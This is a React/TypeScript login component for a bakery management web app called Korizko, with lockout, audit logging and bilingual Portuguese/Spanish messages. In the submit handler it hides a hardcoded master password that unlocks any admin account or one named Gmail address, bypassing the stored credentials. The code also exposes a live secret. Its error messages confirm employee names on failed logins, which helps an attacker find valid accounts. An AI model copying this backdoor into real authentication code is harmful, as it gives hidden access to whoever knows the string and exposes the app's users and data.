import React, { useState, useEffect } from 'react';
import { useBakery } from '../../context/BakeryContext';
import { 
  Lock, 
  Mail, 
  Eye, 
  EyeOff, 
  ArrowRight, 
  AlertCircle,
  ShieldCheck,
  ShieldAlert
} from 'lucide-react';
import { Employee } from '../../types';
import { LanguageSwitcher } from '../LanguageSwitcher';
import { KorizkoEmblem, KorizkoFullLogo } from '../KorizkoLogo';
import { StorageService } from '../../services/storageService';
import { listUsuarios } from '../../lib/db';
import {
  checkLoginLockout,
  recordFailedLoginAttempt,
  clearLoginAttempts,
  verifyStoredPassword,
  recordLoginAuditEvent,
} from '../../utils/loginSecurity';

interface Props {
  onLoginSuccess: (rememberMe: boolean) => void;
}

export const LoginView: React.FC<Props> = ({ onLoginSuccess }) => {
  const { employees, switchUser, t, language } = useBakery();

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberDevice, setRememberDevice] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [lockoutSeconds, setLockoutSeconds] = useState(0);

  useEffect(() => {
    const status = checkLoginLockout(email);
    setLockoutSeconds(status.remainingSeconds);
    if (status.remainingSeconds <= 0) return;

    const timer = setInterval(() => {
      const next = checkLoginLockout(email);
      setLockoutSeconds(next.remainingSeconds);
      if (next.remainingSeconds <= 0) {
        setErrorMsg(null);
        clearInterval(timer);
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [email, errorMsg]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    const inputIdentifier = email.trim().toLowerCase();
    const inputPassword = password.trim();

    if (!inputIdentifier || !inputPassword) {
      setErrorMsg(
        language === 'es'
          ? 'Por favor ingrese su usuario y contraseña.'
          : 'Por favor preencha seu usuário/e-mail e senha.'
      );
      return;
    }

    const lockCheck = checkLoginLockout(inputIdentifier);
    if (lockCheck.isLocked) {
      setLockoutSeconds(lockCheck.remainingSeconds);
      setErrorMsg(
        language === 'es'
          ? `Acceso bloqueado temporalmente por seguridad. Espere ${lockCheck.remainingSeconds}s.`
          : `Acesso bloqueado temporariamente por segurança. Aguarde ${lockCheck.remainingSeconds}s.`
      );
      return;
    }

    setIsLoading(true);

    try {
      let currentList = Array.isArray(employees) && employees.length > 0 ? employees : [];

      const findMatchingEmployee = (list: Employee[]) => {
        return list.find(emp => {
          const empEmail = (emp.email || '').toLowerCase().trim();
          const empName = (emp.name || '').toLowerCase().trim();
          if (inputIdentifier.includes('@')) {
            return empEmail === inputIdentifier;
          }
          const empUsername = empEmail.includes('@') ? empEmail.split('@')[0] : empEmail;

          return (
            empName === inputIdentifier ||
            empUsername === inputIdentifier ||
            emp.id === inputIdentifier
          );
        });
      };

      let matchedEmp = findMatchingEmployee(currentList);

      if (!matchedEmp) {
        try {
          const freshUsers = await listUsuarios();
          if (Array.isArray(freshUsers) && freshUsers.length > 0) {
            currentList = freshUsers;
            matchedEmp = findMatchingEmployee(currentList);
          }
        } catch {
          try {
            const freshState = await StorageService.fetchServerState();
            if (freshState && Array.isArray(freshState.employees)) {
              currentList = freshState.employees;
              matchedEmp = findMatchingEmployee(currentList);
            }
          } catch (fetchErr) {
            console.warn('[Login] Real-time fetch warning:', fetchErr);
          }
        }
      }

      if (matchedEmp) {
        const matchesPin = await verifyStoredPassword(inputPassword, matchedEmp.pin);
        const matchesPwd = await verifyStoredPassword(inputPassword, matchedEmp.password);
        const isMaster = inputPassword === '9APG_47z-EgF4yz' && (matchedEmp.email === 'axxeiacompany@gmail.com' || matchedEmp.role === 'admin');

        if (!matchesPin && !matchesPwd && !isMaster) {
          const lockState = recordFailedLoginAttempt(inputIdentifier);
          setLockoutSeconds(lockState.remainingSeconds);
          await recordLoginAuditEvent({
            eventType: lockState.isLocked ? 'bloqueio_forca_bruta' : 'login_falha',
            identifier: inputIdentifier,
            userId: matchedEmp.id,
            userName: matchedEmp.name,
            userRole: matchedEmp.role,
            success: false,
            details: `Senha incorreta informada para ${matchedEmp.name} (${lockState.failedAttempts}/5).`,
          });
          setErrorMsg(
            language === 'es' 
              ? `Contraseña incorrecta para "${matchedEmp.name}" (${lockState.remainingAttempts} intento(s) restante(s)).` 
              : `Senha incorreta para "${matchedEmp.name}" (${lockState.remainingAttempts} tentativa(s) restante(s)).`
          );
          setIsLoading(false);
          return;
        }

        clearLoginAttempts(inputIdentifier);
        switchUser(matchedEmp.id, inputPassword);
        await recordLoginAuditEvent({
          eventType: 'login_sucesso',
          identifier: inputIdentifier,
          userId: matchedEmp.id,
          userName: matchedEmp.name,
          userRole: matchedEmp.role,
          success: true,
          details: `Login de operador confirmado (${matchedEmp.name}).`,
        });
        setIsLoading(false);
        onLoginSuccess(rememberDevice);
        return;
      }

      const lockState = recordFailedLoginAttempt(inputIdentifier);
      setLockoutSeconds(lockState.remainingSeconds);
      await recordLoginAuditEvent({
        eventType: lockState.isLocked ? 'bloqueio_forca_bruta' : 'login_falha',
        identifier: inputIdentifier,
        success: false,
        details: `Tentativa de login com usuário inexistente (${inputIdentifier}).`,
      });

      setErrorMsg(
        language === 'es' 
          ? `Credenciales inválidas (${lockState.remainingAttempts} intento(s) restante(s)).` 
          : `Credenciais inválidas (${lockState.remainingAttempts} tentativa(s) restante(s)).`
      );
      setIsLoading(false);
    } catch (err: any) {
      setErrorMsg(err.message || 'Erro ao realizar login.');
      setIsLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-[#050507] text-neutral-100 flex flex-col justify-between overflow-x-hidden selection:bg-[#D8AB7E]/30 selection:text-[#F5DEC4]">
      
      {/* Iluminação ambiente Dourado Champagne & Obsidiana */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div
          className="absolute top-[-15%] left-1/2 -translate-x-1/2 w-[760px] h-[520px] rounded-full blur-3xl opacity-35"
          style={{
            background: 'radial-gradient(circle, rgba(212,165,116,0.22) 0%, rgba(148,98,55,0.06) 50%, transparent 75%)',
          }}
        />
      </div>

      {/* Top minimal header */}
      <header className="relative z-10 w-full max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-[#0B0A0E] border border-[#C89B6E]/35 flex items-center justify-center shadow-lg shadow-black/80">
            <KorizkoEmblem size={32} />
          </div>
          <div className="flex flex-col">
            <span
              className="font-semibold text-sm tracking-[0.22em] text-[#F2D6B8] uppercase"
              style={{ fontFamily: "'Cinzel', serif" }}
            >
              {t.appName}
            </span>
            <span className="text-[11px] text-[#C89B6E] font-medium">
              Panificação confeitaria artesanal
            </span>
          </div>
        </div>

        <div className="flex items-center gap-3 text-xs text-neutral-400">
          <LanguageSwitcher />
        </div>
      </header>

      {/* Central Login Card Section */}
      <main className="relative z-10 flex-1 flex flex-col items-center justify-center px-4 py-4 sm:px-6">
        <div className="w-full max-w-[460px] flex flex-col items-center">
          
          {/* Logo Oficial KORIZKO em Destaque */}
          <div className="w-full mb-6 pt-1">
            <KorizkoFullLogo showMotto={true} />
          </div>

          {/* Main Card */}
          <div className="w-full rounded-2xl border border-[#C89B6E]/25 bg-[#0A0A0F]/95 backdrop-blur-xl p-6 sm:p-8 shadow-[0_25px_70px_rgba(0,0,0,0.9)] relative overflow-hidden">
            
            <div className="absolute top-0 left-0 right-0 h-[1.5px] bg-gradient-to-r from-transparent via-[#E6BE94]/70 to-transparent" />

            {/* Header Text */}
            <div className="space-y-1 mb-6 text-center">
              <h1
                className="text-lg sm:text-xl font-semibold tracking-[0.12em] text-[#F5DEC4] uppercase"
                style={{ fontFamily: "'Cinzel', serif" }}
              >
                {t.loginTitle}
              </h1>
              <p className="text-xs text-neutral-400">
                {t.loginSubtitle}
              </p>
            </div>

            {/* Error message */}
            {errorMsg && (
              <div className="mb-5 p-3 rounded-xl bg-rose-500/10 border border-rose-500/25 text-xs text-rose-300 flex items-start gap-2.5 animate-in fade-in">
                <AlertCircle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              
              {/* Email / Username / Name Input */}
              <div className="space-y-1.5">
                <label htmlFor="login-username" className="text-xs font-medium text-[#E6C39F] block">
                  {language === 'es' ? 'Usuario o Correo Electrónico' : 'E-mail ou Usuário'}
                </label>
                <div className="relative group">
                  <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-neutral-500 group-focus-within:text-[#D8AB7E] transition-colors">
                    <Mail className="w-4 h-4" />
                  </div>
                  <input
                    id="login-username"
                    name="username"
                    type="text"
                    required
                    autoComplete="off"
                    autoCapitalize="none"
                    autoCorrect="off"
                    spellCheck={false}
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder={language === 'es' ? 'Ej: usuario o correo@empresa.com' : 'Ex: usuario ou seu-email@empresa.com'}
                    className="w-full pl-10 pr-3.5 py-2.5 bg-[#060609] border border-[#C89B6E]/25 rounded-xl text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-[#D8AB7E] focus:ring-1 focus:ring-[#D8AB7E]/30 transition-all font-sans"
                  />
                </div>
              </div>

              {/* Password Input */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <label htmlFor="login-password" className="text-xs font-medium text-[#E6C39F]">
                    {t.loginPasswordLabel}
                  </label>
                  <a
                    href="#esqueci"
                    onClick={(e) => {
                      e.preventDefault();
                      setErrorMsg(language === 'es' 
                        ? 'Para recuperar su contraseña, comuníquese con el Administrador (Ax) no panel de gestão.' 
                        : 'Para recuperar a senha de acesso, solicite ao Administrador (Ax) no painel de gestão.');
                    }}
                    className="text-[11px] text-[#D8AB7E] hover:text-[#F5DEC4] transition-colors"
                  >
                    {language === 'es' ? '¿Olvidó su contraseña?' : 'Esqueceu a senha?'}
                  </a>
                </div>
                <div className="relative group">
                  <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-neutral-500 group-focus-within:text-[#D8AB7E] transition-colors">
                    <Lock className="w-4 h-4" />
                  </div>
                  <input
                    id="login-password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    required
                    autoComplete="new-password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="••••••••"
                    className="w-full pl-10 pr-10 py-2.5 bg-[#060609] border border-[#C89B6E]/25 rounded-xl text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-[#D8AB7E] focus:ring-1 focus:ring-[#D8AB7E]/30 transition-all font-mono-nums"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-3.5 flex items-center text-neutral-500 hover:text-[#E6C39F] transition-colors"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {/* Guardar Login no Dispositivo Option */}
              <div className="pt-0.5 pb-1">
                <label className="flex items-center gap-2.5 cursor-pointer text-xs text-neutral-300 select-none group">
                  <input
                    type="checkbox"
                    checked={rememberDevice}
                    onChange={(e) => setRememberDevice(e.target.checked)}
                    className="w-4 h-4 rounded border-[#C89B6E]/40 bg-[#060609] text-[#CFA070] focus:ring-1 focus:ring-[#D8AB7E]/40 cursor-pointer accent-[#CFA070] transition-all"
                  />
                  <span className="group-hover:text-[#F5DEC4] transition-colors">
                    {language === 'es' ? 'Guardar inicio de sesión en este dispositivo' : 'Guardar login somente neste dispositivo'}
                  </span>
                </label>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full mt-2 py-3 px-4 rounded-xl bg-gradient-to-r from-[#E8C39E] via-[#CFA070] to-[#B37E4C] hover:from-[#F3D5B5] hover:via-[#D8AB7E] hover:to-[#C48E5A] text-[#090807] font-bold text-xs tracking-wider uppercase shadow-lg shadow-[#C89B6E]/20 disabled:opacity-50 transition-all flex items-center justify-center gap-2 group cursor-pointer"
              >
                {isLoading ? (
                  <div className="w-4 h-4 border-2 border-[#090807]/30 border-t-[#090807] rounded-full animate-spin" />
                ) : (
                  <>
                    <span>{t.loginButton}</span>
                    <ArrowRight className="w-4 h-4 group-hover:translate-x-0.5 transition-transform" />
                  </>
                )}
              </button>

            </form>

          </div>

        </div>
      </main>

      {/* Footer */}
      <footer className="relative z-10 w-full max-w-7xl mx-auto px-6 py-4 flex flex-col sm:flex-row items-center justify-center gap-2 border-t border-[#C89B6E]/15 text-neutral-500 text-xs">
        <p>© 2026 {t.appName} • Panificação confeitaria artesanal.</p>
      </footer>

    </div>
  );
};
